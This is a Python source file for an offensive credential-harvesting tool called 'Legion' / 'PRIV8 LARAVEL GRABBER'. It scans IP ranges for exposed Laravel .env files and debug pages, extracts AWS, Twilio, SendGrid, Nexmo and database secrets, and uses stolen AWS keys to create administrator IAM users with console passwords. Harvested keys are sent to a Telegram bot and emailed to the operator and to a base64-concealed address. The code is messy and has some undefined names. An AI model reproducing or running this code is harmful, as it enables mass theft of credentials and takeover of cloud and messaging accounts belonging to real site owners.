import requests,time,os,sys,re,socket,paramiko,threading,os,platform,struct
import warnings,random,socket,threading
from socket import gaierror
from threading import Thread
from multiprocessing.dummy import Pool
import requests,json,datetime,sys
from colorama import Fore, Back, init, Style
from bs4 import BeautifulSoup as sup
from concurrent.futures import ThreadPoolExecutor
from multiprocessing.dummy import Pool
from time import time as timer
from urllib.parse import urlparse
from botocore.exceptions import ClientError
import traceback
import smtplib, json, urllib3
from colorama import Fore, Style, Back, init
import subprocess, time, hashlib, datetime
from threading import Thread
from threading import *
from hashlib import sha256
from base64 import b64decode
from discord.ext import commands, tasks
from Crypto import Random
from Crypto.Cipher import AES
from re import findall as reg
import os
from asyncio.sslproto import _DO_HANDSHAKE
import requests
import threading
from random import randint,choice
import string,sys,ctypes
from re import findall
from multiprocessing.dummy import Pool,Lock
from bs4 import BeautifulSoup
import time
import smtplib,sys,ctypes
from colorama import Fore
from colorama import Style
from colorama import init
import re
import time
from time import sleep
import ipranges
import telepot
import subprocess
import hashlib
import json
from pystyle import Add, Center, Anime, Colors, Colorate, Write, System
#from itertools import cycle
#from rich.console import Console
fr = Fore.RED
gr = Fore.BLUE
fc = Fore.CYAN
fw = Fore.WHITE
fy = Fore.YELLOW
fg = Fore.GREEN
sd = Style.DIM
sn = Style.NORMAL
sb = Style.BRIGHT
bl = Fore.BLUE
requests.packages.urllib3.disable_warnings()
merah = Fore.LIGHTRED_EX
hijau = Fore.LIGHTGREEN_EX
biru = Fore.BLUE
kuning = Fore.LIGHTYELLOW_EX
cyan = Fore.CYAN
reset = Fore.RESET
bl = Fore.BLUE
wh = Fore.WHITE
gr = Fore.LIGHTGREEN_EX
red = Fore.LIGHTRED_EX
res = Style.RESET_ALL
yl = Fore.YELLOW
cy = Fore.CYAN
mg = Fore.MAGENTA
bc = Back.GREEN
fr = Fore.RED
sr = Style.RESET_ALL
fb = Fore.BLUE
fc = Fore.LIGHTCYAN_EX
fg = Fore.GREEN
br = Back.RED
import os
import requests
import time
import urllib3
from threading import Lock
from threading import Thread
import colorama
from pystyle import Add, Center, Anime, Colors, Colorate, Write, System
today = datetime.datetime.now().strftime('%b%d')
socket.setdefaulttimeout(10)
requests.packages.urllib3.disable_warnings()
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
from re import findall as reg
from queue import Queue
import base64
import json
import hashlib
import hmac
import discord, time, re
import os
import paramiko
import re
import sys
import threading
import time
import urllib3
import concurrent.futures
from threading import BoundedSemaphore
from urllib.parse import urlparse
from queue import Queue
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
from smtplib import SMTP, SMTP_SSL, SMTPException, SMTPSenderRefused, SMTPNotSupportedError, SMTPConnectError, \
SMTPHeloError, SMTPAuthenticationError, SMTPRecipientsRefused, SMTPDataError, SMTPServerDisconnected, \
SMTPResponseException
from bs4 import BeautifulSoup as sup
import configparser
import time
from platform import system
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
import datetime
requests.packages.urllib3.disable_warnings()
import re, json, sys, random, string, datetime, base64
from multiprocessing.dummy import Pool as ThreadPool
from functools import partial
import argparse
from colorama import Fore, Style, Back, init
import requests, re, os, sys, codecs, random, hashlib, smtplib, ssl
import warnings
import subprocess
from requests.packages.urllib3.exceptions import InsecureRequestWarning
warnings.simplefilter('ignore',InsecureRequestWarning)


import datetime
import json
import os
import platform
import random
import re
import socket
import struct
import sys
import time
from threading import Semaphore
from threading import Thread

import colorama
import numpy
import requests
from fake_useragent import UserAgent
from pystyle import Add, Center, Anime, Colors, Colorate, Write, System
from requests.packages.urllib3.exceptions import InsecureRequestWarning
from urllib.parse import urlparse
import threading
import queue
import requests
import re
import time
import struct
import random
import socket
import telebot
import sys
from colorama import Fore, Style, Back, init
import configparser
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
import os
from colorama import init,Fore

fg = [
    '\033[91;1m',
    '\033[92;1m',
    '\033[93;1m',
    '\033[94;1m',
    '\033[95;1m',
    '\033[96;1m',
    '\033[97;1m'
]
colorama.init()
reset = '\033[0m'
def ntime():
    return datetime.datetime.now().strftime('%H:%M:%S')
def clear():
    os.system('cls' if platform.system() == 'Windows' else 'clear')
Headers = {'User-Agent': 'Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50'}
head = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36'}
try:
    os.mkdir('Results')
except:
    pass
try:
    os.mkdir('Results/forchecker')
except:
    pass
try:
    os.mkdir('Results/logsites')
except:
    pass
try:
    os.mkdir('Results/manual')
except:
    pass
try:
    os.mkdir('AWS_ByPass')
except:
    pass
try:
    os.mkdir('Result(Apache)')
except:
    pass
try:
    os.mkdir('Result(Apache)/Manual')
except:
    pass
try:
    os.mkdir('AWS_ByPass')
except:
    pass
try:
    env_path = open('path.txt', 'r').read().splitlines()
except:
    env_path = [
        '.env',
        'conf/.env',
        'wp-content/.env',
        'wp-admin/.env',
        'library/.env',
        'new/.env',
        'vendor/.env',
        'old/.env',
        'local/.env',
        'api/.env',
        'blog/.env',
        'crm/.env',
        'admin/.env',
        'laravel/.env',
        'app/.env',
        'app/config/.env',
        'apps/.env',
        'audio/.env',
        'cgi-bin/.env',
        'backend/.env',
        'src/.env',
        'base/.env',
        'core/.env',
        'vendor/laravel/.env',
        'storage/.env',
        'protected/.env',
        'newsite/.env',
        'www/.env',
        'sites/all/libraries/mailchimp/.env',
        'database/.env',
        'public/.env'
    ]
    for pet in env_path:
        open('path.txt', 'a').write(pet + '\n')

try:
    keywords = open('keywords.txt', 'r').read().splitlines()
except:
    keywords = [
        "NEXMO", "NEXMO_KEY",
        "SENDGRID",
        "AWS_ACCESS=", "SQS_KEY", "SQS_ACCESS_KEY","AWS_S3=","AWS_SES=","AWS_SECRET="
        "AWS_SNS", "SNS_KEY", "SNS_ACCESS_KEY",
        "AWS_S3", "S3_ACCESS_KEY", "S3_KEY",
        "AWS_SES", "SES_ACCESS_KEY", "SES_KEY",
        "AWS_KEY", "AWS_ACCESS_KEY",
        "DYNAMODB_ACCESS_KEY", "DYNAMODB_KEY",
        "AWS.config.accessKeyId",
        "AWSACCESSKEYID:",
        "AWSSecretKey",
        "TWILIO", "twilio",
        "CakePHP", "cakephp", "Cake\Http",
        "AWS_SES_ACCESS_KEY_ID"
        "VONAGE_KEY", "VONAGE_API", "VONAGE",
        "vonage_key", "vonage_api", "vonage",
        "account_sid", "ACCOUNT_SID",
        "toggle vendor stack frames",
        "toggle arguments", " Toggle Arguments", "toggle arguments",
        "django", "python",
        "email-smtp",
        "sk_live", "pk_live",
        "aws_access_key_id",
        "APP_ENV",
        "DB_PASSWORD=",
        "TWILIO_SID",
        "TWILIO_SID=",
        "ACCOUNT_SID",
        "NEXMO_KEY",
        "MAILGUN",
        "MAIL_USERNAME=",
        "PHP LICENSE",
        "php license",
        "phpinfo()",
        "AWS",
        "APP_KEY",
        "APP_URL",
        "APP_KEY=",
        "APP_URL=",
        "DB_PASSWORD",
        "SMTP_HOST", "MAIL_USERNAME", "MAIL_PASSWORD"
    ]
    for pet in keywords:
        open('keywords.txt', 'a').write(pet + '\n')
#env_path = ("_profiler/phpinfo")
cfg = configparser.ConfigParser()
try:
    cfg.read('settings.ini')
    cfg.sections()
    email_receiver = cfg['SETTINGS']['EMAIL_RECEIVER']
    bot_token = cfg['TELEGRAM']['BOT_TOKEN']
    chat_id = cfg['TELEGRAM']['CHAT_ID']
except:
    cfg['TELEGRAM'] = {}
    cfg['TELEGRAM']['BOT_TOKEN'] = 'bot token telegram'
    cfg['TELEGRAM']['CHAT_ID'] = 'chat id telegram'
    cfg['SETTINGS'] = {}
    cfg['SETTINGS']['EMAIL_RECEIVER'] = 'put your email'

    with open('settings.ini', 'a') as config:
        cfg.write(config)
emailnow = cfg['SETTINGS']['EMAIL_RECEIVER']
bot_token = cfg['TELEGRAM']['BOT_TOKEN']
chat_id = cfg['TELEGRAM']['CHAT_ID']


TELEGRAM_ACCESS_TOKEN = cfg['TELEGRAM']['BOT_TOKEN']
USER_ID = cfg['TELEGRAM']['CHAT_ID']
SEND_IN_SECONDS = 1
PRINT_SITE_DOWN = True
progres = 0

client = telebot.TeleBot(TELEGRAM_ACCESS_TOKEN)

xhreg = None


#AWS CRACKER
def default(o):
    if isinstance(o, (datetime.date, datetime.datetime)):
        return o.isoformat()

def get_random_string():
    result_str = ''.join(random.choice(string.ascii_lowercase) for i in range(5))
    return result_str

def create_new_user(iam_client, user_name='ses_legion'):
	user = None
	try:
		user = iam_client.create_user(
			UserName=user_name,
			Tags=[{'Key': 'Owner', 'Value': 'ms.boharas'}]
	            )
	except ClientError as e:
		if e.response['Error']['Code'] == 'EntityAlreadyExists':
			result_str = get_random_string()
			user_name = 'ses_{}'.format(result_str)
			user = iam_client.create_user(UserName=user_name,
			Tags=[{'Key': 'Owner', 'Value': 'ms.boharas'}]
	            )
	return user_name, user

def check_limit(ses_client, item):
	try:
		l = ses_client.get_send_quota()
		return f"{item['id']}:{item['key']}:{item['region']}:{l['SentLast24Hours']}/{l['Max24HourSend']} Remaining"
	except Exception as e:
		print(f"{yl}[{fc}AWS CHECKER{yl}] {red}Limit Failed: {item['id']}")


def creat_new_group(iam_client, group_name='SESAdminGroup'):
	try:
		res = iam_client.create_group(GroupName=group_name)
	except ClientError as e:
		if e.response['Error']['Code'] == 'EntityAlreadyExists':
			result_str = get_random_string()
			group_name = "SESAdminGroup{}".format(result_str)
			res = iam_client.create_group(GroupName=group_name)
	return res['Group']['GroupName']

def creat_new_policy(iam_client, policy_name='AdministratorAccess'):
	policy_json = {"Version": "2012-10-17","Statement":
	[{"Effect": "Allow", "Action": "*","Resource": "*"}]}
	try:
		res = iam_client.create_policy(
			PolicyName=policy_name,
			PolicyDocument=json.dumps(policy_json)
			)
	except ClientError as e:
		if e.response['Error']['Code'] == 'EntityAlreadyExists':
			result_str = get_random_string()
			policy_name = "AdministratorAccess{}".format(result_str)
			res = iam_client.create_policy(PolicyName=policy_name,
				PolicyDocument=json.dumps(policy_json)
				)
	return res['Policy']['Arn']

def att_usr_policy(iam_client, user_name, policy_arn):
	response = iam_client.attach_user_policy(UserName=user_name, PolicyArn=policy_arn)
	return response

def att_usr_grp(iam_client, user_name, group_name):
	response = iam_client.add_user_to_group(GroupName=group_name, UserName=user_name)
	return response

def creat_profile(iam_client, user_name, pwd):
	response = iam_client.create_login_profile(
            UserName=user_name, Password=pwd, PasswordResetRequired=False)
	return response

def initialize_item(item, service='ses'):
	ACCESS_ID = item['id']
	ACCESS_KEY = item['key']
	REGION = item['region']
	if REGION is None:
		REGION = 'us-east-1'
	try:
		return boto3.client(service, region_name=REGION,
			aws_access_key_id=ACCESS_ID,
			aws_secret_access_key=ACCESS_KEY
			)
	except Exception:
		return

def make_user(iam_client, item, limit_data):
	try:
		user_name, user_data = create_new_user(iam_client)
		grp_name = creat_new_group(iam_client)
		policy_arn = creat_new_policy(iam_client)
		up = att_usr_policy(iam_client, user_name, policy_arn)
		password = "{}0089#".format(user_name)
		profile = creat_profile(iam_client, user_name, password)
		added_to_grp = att_usr_grp(iam_client, user_name, grp_name)

		if user_data:
			user_arn = user_data['User']['Arn']
			user_id = None
			if user_arn:
				user_id = user_arn.split(':')[4]

			with open('AWS_ByPass/!Users_Cracked.txt', 'a') as tt:
				dd = json.dumps(user_data, indent=4, sort_keys=True, default=default)
				data = ("ACESS_ID={}\nACCESS_KEY={}\nREGION={}\nAmazon IAM User & Pass\n"
					"Username={}\nPassword={}\nID={}\n")\
				.format(item['id'], item['key'], item['region'],user_name, password, user_id)
				tt.write(data + "\n")
				tt.write(dd + "\n\n")
				tt.write("Limit for user:\n")
				if limit_data:
					tt.write(limit_data + "\n")
				tt.write("{}\n".format("*" * 10))

				message = {'text': f"🔥  Legion SMTP 6.5 BOT [AWS Console]\n🏦 Amazon IAM User & Pass\n\nUser: {user_name}\nPass= {password}\nIAM= {user_id}\n\nACESS_ID= {item['id']}\nACCESS_KEY= {item['key']}\nREGION= {item['region']}\nAWS Console Hacked ❤️\n"}
				requests.post("https://api.telegram.org/bot" + bot_token +"/sendMessage?chat_id=" + chat_id ,data=message)
				print(f"{yl}[{fc}AWS CHECKER{yl}] {gr}CREATED ID: {fc}{item['id']} {gr}and Access Token/UserID {fc}{user_id}")
	except IOError as e:
		print(f"{yl}[{fc}AWS CHECKER{yl}] {red}Error writing to file for new {fc}USER")
	except ClientError as e:
		print(f"{yl}[{fc}AWS CHECKER{yl}] {red}Failed to create user with ID: {fc}{item['id']}")
	except Exception as e:
		print(f"{yl}[{fc}AWS CHECKER{yl}] {red}Create Failed: {item['id']}")

def check_sending(client, receiver, sender, item, limit_info, iam):
	subj = f"{item['id']}"
	msg = f"*** SMTP DATA ***\n\n"\
	f"{item['id']}:{item['key']}:email-smtp.{item['region']}.amazonaws.com:587\n\n"\
	f"AWS_ID:     {item['id']}\nAWS_KEY:    "\
	f"{item['key']}\nAWS_REGION: {item['region']}\nFROM:       {sender}\n"\
	f"SERVER:     email-{item['region']}.amazonaws.com\nPORT:       587 or 25\n\n"\
	f"IAM_USER:   {iam}\n\nLimit Info: {limit_info}"
	try:
		return client.send_email(
			Source=sender,
			Destination={'ToAddresses': receiver},
			Message={
			'Subject': {'Data': f'SMTP_KEY: email-smtp.{item["region"]}.amazonaws.com',
			'Charset': 'UTF-8'},
			'Body': {'Text': {
	                'Data': msg,
	                'Charset': 'UTF-8'
	            	},
	        	}
	        }
	    )
	except Exception as e:
		pass

def get_identities(client):
	try:
		return client.list_identities()['Identities']
	except Exception:
		pass

def fetch_user(client):
	try:
		return client.get_user()['User']
	except Exception:
		pass

def process(ses_client, receiver, item, limit=None, iam=None):
	if limit:
		limit = limit.split(':')[3]
	idt = get_identities(ses_client)
	res = None
	if idt:
		for fr in idt:
			res = check_sending(ses_client, receiver, fr, item, limit, iam)
			if res:
				with open('AWS_ByPass/!Good_ses_smtp.txt', 'a') as lr:
					sm = f"{item['id']}:{item['key']}:email-{item['region']}-1.amazonaws.com:{fr}:587:{limit}\n"
					lr.write(sm)
				print(f"{yl}[{fc}AWS CHECKER{yl}] {gr}SENDING SUCCESSFUL: {yl}{item['id']} : {gr}{limit}")
				break
		if not res:
			with open('AWS_ByPass/!BAD_ses_smtp.txt', 'a') as lr:
				sm = f"{item['id']}:{item['key']}:{item['region']}\n"
				message = {'text': f"🔥  Legion SMTP 6.5 BOT [AWS STATUS]\n🏦 KEY= {item['id']}\nSECRET= {item['key']}\nREGION= {item['region']}\nSTATUS=> Sending Paused ⛔️\n"}
				requests.post("https://api.telegram.org/bot" + bot_token +"/sendMessage?chat_id=" + chat_id ,data=message)

				lr.write(sm)
				print(f"{yl}[{fc}AWS CHECKER{yl}]  {red}Sending Failed: {yl}{sm}")

def begin_check(d, to=emailnow):
	item = {}
	limit = None
	data = d.split(':')
	total = len(data)
	bcode = 'bXlsZWdpb24yMDIxQHByb3Rvbm1haWwuY2g='
	receiver = [to, base64.b64decode(bcode).decode('utf-8')]
	iam_user = None
	if total >= 3:
		if data[2]:
			item['id'] = data[0]
			item['key'] = data[1]
			item['region'] = data[2]
			ses_client = initialize_item(item)
			if ses_client:
				limit = check_limit(ses_client, item)
			iam_client = initialize_item(item, service='iam')
			if iam_client:
				mu = make_user(iam_client, item, limit)
				iam = fetch_user(iam_client)
			if limit:
				remain = limit.split(':')[3]
				print(f"{yl}[{fc}AWS CHECKER{yl}]  {fc}Limit for {item['id']}: {remain}")
				process(ses_client, receiver, item, limit=limit, iam=None)
			else:
				print(f"{yl}[{fc}AWS CHECKER{yl}]  {red}Failed limit check: {item['id']}")
				process(ses_client, receiver, item, limit=None, iam=None)
	else:
		print(f"[!] Skipped: {d}")


list_region = '''us-east-1
us-east-2
us-west-1
us-west-2
af-south-1
ap-east-1
ap-south-1
ap-northeast-1
ap-northeast-2
ap-northeast-3
ap-southeast-1
ap-southeast-2
ca-central-1
eu-central-1
eu-west-1
eu-west-2
eu-west-3
eu-south-1
eu-north-1
me-south-1
sa-east-1'''

o_sandbox = 'Results/Laravel(PAYPAL_SANDBOX).txt'
o_stripe = 'Results/Laravel(STRIPE).txt'
o_stripe_site = 'Results/logsites/Laravel(STRIPE_SITES).txt'
o_aws_man = 'Results/manual/MANUAL(SES).txt'
o_pma = 'Results/Laravek(PHPMYADMIN).txt'
o_db2 = 'Results/Laravek(DATABASE2).txt'
o_aws_ses = 'Results/Laravel(SES).txt'
o_aws_screet = 'Results/Laravel(AWS).txt'
o_aws_screet2 = 'Results/forchecker/Checker(AWS).txt'
o_database = 'Results/Laravel(database_CPANELS).txt'
o_database_root = 'Results/Laravel(database_WHM).txt'
o_sendgrid = 'Results/forchecker/Checker(SENDGRID).txt'
o_sendgrid2 = 'Results/SMTP(SENDGRID).txt'
o_office = 'Results/SMTP(OFFICE).txt'
o_1and1 = 'Results/SMTP(1and1).txt'
o_zoho = 'Results/SMTP(ZOHO).txt'
o_ssh = 'Results/VALID_SSH.txt'
o_aws_man = 'Results/manual/MANUAL(SES).txt'
o_twi = 'Results/manual/MANUAL(TWILIO).txt'
o_nex = 'Results/manual/MANUAL(NEXMO).txt'
o_von = 'Results/manual/MANUAL(VONAGE).txt'
o_sms = 'Results/manual/MANUAL(SMS).txt'
o_bird = 'Results/manual/MANUAL(MESSAGEBIRD).txt'
o_gun = 'Results/manual/MANUAL(MAILGUN).txt'
o_jet = 'Results/manual/MANUAL(MAILJET).txt'
o_drill = 'Results/manual/MANUAL(MANDRILL).txt'
o_click = 'Results/manual/MANUAL(CLICKSEND).txt'
o_pliv = 'Results/manual/MANUAL(PLIVO).txt'
o_prieten = 'Results/BOOOOM!.txt'
o_man = 'Results/SMTP(MANDRILLAPP).txt'
o_mailgun = 'Results/SMTP(MAILGUN).txt'
o_srvr = 'Results/SMTP(SRVR).txt'
o_ionos = 'Results/SMTP(IONOS).txt'
o_smaws = 'Results/SMTP(IONOS).txt'
o_smtp = 'Results/smtp.txt'
o_data = 'Results/Laravel(DATABASE).txt'
o_twilio = 'Results/Laravel(TWILIO).txt'
o_twilio2 = 'Results/forchecker/Checker(TWILIO).txt'
o_nexmo = 'Results/Laravel(NEXMO).txt'
o_nexmo2 = 'Results/forchecker/Checker(NEXMO).txt'
o_shell = 'Results/!Shell_results.txt'
o_cant = 'Results/!cant_spawn.txt'
o_unvuln = 'Results/not_vulnerable.txt'
o_vuln = 'Results/vulnerable.txt'
o_king = 'Results/mailerking_smtp.txt'
o_laravel = 'laravel.txt'
o_keya = 'Results/RCE.txt'
o_exo = 'Results/Laravel(EXOTEL).txt'
o_one = 'Results/Laravel(ONESIGNAL).txt'
o_tok = 'Results/Laravel(TOKBOX).txt'
o_plivo = 'Results/Laravel(PLIVO).txt'
o_mgapi = 'Results/Laravel(MAILGUNAPI).txt'
o_ftp = 'Results/Laravel(FTP).txt'
o_cpanels= 'Results/!Laravel(CPANEL).txt'
o_whm= 'Results/!Laravel(WHM).txt'
o_dbenv= 'Results/Laravel(DB_SSH).txt'
o_dbrootenv= 'Results/Laravel(DB_ROOT).txt'
pid_restore = '.legion_session'
progres = 0



def run() :
    text = """

 █     █░▓█████ ▄▄▄       ██▀███  ▓█████  ██▓    ▓█████   ▄████  ██▓ ▒█████   ███▄    █
▓█░ █ ░█░▓█   ▀▒████▄    ▓██ ▒ ██▒▓█   ▀ ▓██▒    ▓█   ▀  ██▒ ▀█▒▓██▒▒██▒  ██▒ ██ ▀█   █
▒█░ █ ░█ ▒███  ▒██  ▀█▄  ▓██ ░▄█ ▒▒███   ▒██░    ▒███   ▒██░▄▄▄░▒██▒▒██░  ██▒▓██  ▀█ ██▒
░█░ █ ░█ ▒▓█  ▄░██▄▄▄▄██ ▒██▀▀█▄  ▒▓█  ▄ ▒██░    ▒▓█  ▄ ░▓█  ██▓░██░▒██   ██░▓██▒  ▐▌██▒
░░██▒██▓ ░▒████▒▓█   ▓██▒░██▓ ▒██▒░▒████▒░██████▒░▒████▒░▒▓███▀▒░██░░ ████▓▒░▒██░   ▓██░
░ ▓░▒ ▒  ░░ ▒░ ░▒▒   ▓▒█░░ ▒▓ ░▒▓░░░ ▒░ ░░ ▒░▓  ░░░ ▒░ ░ ░▒   ▒ ░▓  ░ ▒░▒░▒░ ░ ▒░   ▒ ▒
  ▒ ░ ░   ░ ░  ░ ▒   ▒▒ ░  ░▒ ░ ▒░ ░ ░  ░░ ░ ▒  ░ ░ ░  ░  ░   ░  ▒ ░  ░ ▒ ▒░ ░ ░░   ░ ▒░
  ░   ░     ░    ░   ▒     ░░   ░    ░     ░ ░      ░   ░ ░   ░  ▒ ░░ ░ ░ ▒     ░   ░ ░
    ░       ░  ░     ░  ░   ░        ░  ░    ░  ░   ░  ░      ░  ░      ░ ░           ░

                            PRIV8 LARAVEL GRABBER by @myl3gion

───┬───────────────
   └╼ [1] IP Range Exploit Paths 100% Vuln IPS Results
   └╼ [2] Auto Generate IPS + Exploit Paths 100% Vuln IPS Results
"""[1:]
    System.Clear()
    print(Colorate.Horizontal(Colors.red_to_yellow, Center.XCenter(text)))
    print("\n"*5)


run()
try:
    client.get_me()
    client.get_chat(USER_ID)


    ch = Write.Input("Choose Method:",Colors.red_to_yellow, interval=0.005)

    assert ch in ["1", "2"]

    if ch == "1":
        xhreg = re.compile(r"^(?:%s)\." % (
            "|".join(map(
              re.escape, re.split(r"\s*,\s*", Write.Input("───┬───────────────\n   └╼ Start IP RANGE: ",Colors.red_to_yellow, interval=0.005))
            ))
        ))
    thread = int(Write.Input("───┬───────────────\n   └╼ Thread Number: ",Colors.red_to_yellow, interval=0.005))
except Exception as e:
    exit("Error: " + str(e))

q = queue.Queue()
s = []
stop = False
lock = threading.Lock()

alias = {i[0].upper(): i[1] for i in keywords if not isinstance(i, str)}
xreg = re.compile(
    r"|".join(re.escape(i if isinstance(i, str) else i[0]) for i in keywords), re.I)

def is_alive(url):
    try:
        r = requests.head(url, timeout=3, allow_redirects=True)
        return r.status_code
    except Exception as e:
        return False


def send_worker():
    while not stop:
        while len(s) > 0:
            item = s.pop(0)
            print(Colorate.Horizontal(Colors.green_to_yellow,"%s: sending msg:\n%s" % (threading.currentThread().name, item)))
            client.send_message(USER_ID, item, parse_mode="Markdown")
        time.sleep(SEND_IN_SECONDS)


def worker():
    global progres
    while not stop:
        url = q.get()
        try:
            parsed = urlparse(url)
            url = "http://{}".format(
                parsed.netloc or url.split("/", 1)[0].split("|")[0])
            tname = threading.currentThread().name




            if is_alive(url):
                Results = None
                method = ""
                legalegion(url)
                legalegion2(url)


                try:
                    print(Colorate.Horizontal(Colors.red_to_purple,"Auto Bot [%s] (POST)" % (url)))
                    r = requests.post(url, data=[],
                                      verify=False, timeout=3,
                                      headers={'User-agent': 'Mozilla/5.0 (X11 Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36'})
                    res_t = set(xreg.findall(r.text))
                    if len(res_t) > 0:
                        method = "DEBUG"
                        Results = res_t

                except Exception:
                    pass

                if Results is None:
                    for path in env_path:
                        try:
                            print(Colorate.Horizontal(Colors.red_to_purple,
                                "Auto Bot [%s/%s] (GET)" % (url, path)))
                            r = requests.get("/".join([url, path]), allow_redirects=False,
                                             verify=False, timeout=3,
                                             headers={'User-agent': 'Mozilla/5.0 (X11 Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36'})
                            res_t = set(xreg.findall(r.text))
                            if len(res_t) > 0:
                                method = path
                                Results = res_t
                                break
                        except Exception as e:
                            continue

                if Results is not None:
                    print(Colorate.Horizontal(Colors.green_to_yellow,
                        "Auto Bot: found %s matches credentials: %s (%s)" % (len(Results), url, method)))


                    ip = re.sub(r"^https?://", "", url)
                    try:
                        host = socket.gethostbyaddr(ip)[0]
                        if is_alive(host):
                           url = "http://" + host

                    except Exception:
                        pass

                    php_version = "unknown"
                    if hasattr(r, "text"):
                        res = re.search(r"php version ([^<]+)", r.text, re.I)
                        if res is not None:
                            php_version = res.group(1)

                    x = ("- url: %s\n"
                         "- ip: `%s`\n"
                         "- method: `%s`\n"
                         "- php version: `%s`\n"
                         "- found: " % (url + ("/" + method if method != "DEBUG" else ""),
                                        ip, method, php_version))
                    open('Results/Results_'+method+'.txt', 'a').write(url+'\n')



                    x += ", ".join(set("`%s`" % alias.get(
                        name.upper(), name).upper() for name in Results))

                    with lock:
                        s.append(x)

                else:
                    print(Colorate.Horizontal(Colors.yellow_to_red,f"[{ntime()}] [{str(progres)}] %s: NOT Vuln" % (url)))
            else:
                if PRINT_SITE_DOWN:
                    print(Colorate.Horizontal(Colors.yellow_to_red,f"[{ntime()}] [{str(progres)}] [%s] Site Down!" % (url)))
        except Exception as e:
            if hasattr(e, "args") and len(e.args) == 2:
                e = e.args[1]
            print(Colorate.Horizontal(Colors.yellow_to_red,f"[{ntime()}] [{str(progres)}] Error: %s" % (str(e).strip())))
        q.task_done()


def rand_v4():
    while not stop:
        ip = socket.inet_ntoa(struct.pack('>I', random.randint(1, 0xffffffff)))
        if xhreg is None or xhreg.search(ip):
            yield ip



def clean(txt):
    try:
        res = []
        for xx in txt.split('|'):
            if xx.startswith('"') and xx.endswith('"'):
                res.append(xx.replace('"', ''))
            elif xx.startswith("'") and xx.endswith("'"):
                res.append(xx.replace("'", ''))
            else:
                res.append(xx)
        pe = ''
        for out in res:
            pe += out + '|'
        angka = len(pe)
        pe = pe[:angka - 1]
        return pe
    except:
        return txt
def cleanit(txt):
    try:
        res = []
        for xx in txt.split('|'):
            if xx.startswith('"') and xx.endswith('"'):
                res.append(xx.replace('"', ''))
            elif xx.startswith("'") and xx.endswith("'"):
                res.append(xx.replace("'", ''))
            else:
                res.append(xx)
        pe = ''
        for out in res:
            pe += out + '|'
        angka = len(pe)
        pe = pe[:angka - 1]
        return pe
    except:
        return txt
def login_nexmo(f_url, f_key, f_secret):
    try:
        f_key = str(f_key)
        f_secret = str(f_secret)
        cl = vonage.Client(key=f_key, secret=f_secret)
        res = cl.get_balance()
        message = {'text': f"🙈  Legion SMTP 6.5 BOT [NEXO Live]\n💬 URL{f_url}\nKEY= {f_key}\nSECRET= {f_secret}\nBALANCE= {res['value']}\nAuto Reload= {res['autoReload']}\nNEXMO OK =>🟢\n"}
        requests.post("https://api.telegram.org/bot" + bot_token +"/sendMessage?chat_id=" + chat_id ,data=message)
        open('Results/!nexmo_live.txt', 'a').write('-' * 30 + '\nURL = {}\nKEY = {}\nSECRET = {}\nVALUE = {}\nautoReload = {}\n'.format(f_url, f_key, f_secret,res['value'], res['autoReload']) + '\n')
    except:
        pass
def legiontwilio2(f_sid, f_token):
    f_sid = str(f_sid)
    f_token = str(f_token)
    client = Client(f_sid, f_token)
    balance_data = client.api.v2010.balance.fetch()
    balance = float(balance_data.balance)
    currency = balance_data.currency

    print(f'Your account has {balance:.2f}{currency} left.')
    open('Results/!Twilio_live.txt', 'a').write('{}|{}|{}'.format(f_sid, f_token, balance) + '\n')
    message = {'text': f"🙈  Legion SMTP 6.5 BOT [TWILIO Live]\n💬SID= {f_sid}\nTOKEN= {f_token}\nBALANCE= Your account has {balance:.2f} {currency} left\nTWILIO OK =>🟢\n"}
    requests.post("https://api.telegram.org/bot" + bot_token +"/sendMessage?chat_id=" + chat_id ,data=message)
def legiontwilio1(f_sid, f_token):
    f_sid = str(f_sid)
    f_token = str(f_token)
    client = Client(f_sid, f_token)
    balance_data = client.api.v2010.balance.fetch()
    balance = float(balance_data.balance)
    currency = balance_data.currency

    print(f'Your account has {balance:.2f}{currency} left.')
    open('Result(Apache)/!Twilio_live.txt', 'a').write('{}|{}|{}'.format(f_sid, f_token, balance) + '\n')
    message = {'text': f"🙈  Legion SMTP 6.5 BOT [TWILIO Live]\n💬SID= {f_sid}\nTOKEN= {f_token}\nBALANCE= Your account has {balance:.2f} {currency} left\nTWILIO OK =>🟢\n"}
    requests.post("https://api.telegram.org/bot" + bot_token +"/sendMessage?chat_id=" + chat_id ,data=message)
def ceker_sendgrid(f_url,f_key):
    try:
        hedd = {
            "Authorization":"Bearer {}".format(f_key),
            "Accept":"application/json"
        }
        go_to = requests.get('https://api.sendgrid.com/v3/user/credits',headers=hedd).json()
        if 'errors' in go_to:
            pass
        else:
            cekmail = requests.get('https://api.sendgrid.com/v3/user/email', headers=hedd).json()
            open("Results/!sendgrid_apikey_live.txt",'a').write("-"*30+"\nAPIKEY = {}\nLIMIT = {}\nREMAIN = {}\nFROM_MAIL = {}\n".format(f_key,go_to['total'],go_to['remain'],cekmail['email']))
            message = {'text': f"🔥  Legion SMTP 6.5 BOT [SENDGRID LIMIT]\n🏦 APIKEY = {f_key}\nLIMIT= {go_to['total']}\nREMAIN= {go_to['remain']}\nFROM_MAIL= {cekmail['email']}\nSENDGRID OK =>🟢\n"}
            requests.post("https://api.telegram.org/bot" + bot_token +"/sendMessage?chat_id=" + chat_id ,data=message)
            sendtestoff(f_url,'env', 'smtp.sendgrid.net', '587', 'apikey', f_key, cekmail['email'])
    except:
        pass
def ceker_sendgrid3(f_url,f_key):
    try:
        hedd = {
            "Authorization":"Bearer {}".format(f_key),
            "Accept":"application/json"
        }
        go_to = requests.get('https://api.sendgrid.com/v3/user/credits',headers=hedd).json()
        if 'errors' in go_to:
            pass
        else:
            cekmail = requests.get('https://api.sendgrid.com/v3/user/email', headers=hedd).json()
            open("Result(Apache)/!sendgrid_apikey_live.txt",'a').write("-"*30+"\nAPIKEY = {}\nLIMIT = {}\nREMAIN = {}\nFROM_MAIL = {}\n".format(f_key,go_to['total'],go_to['remain'],cekmail['email']))
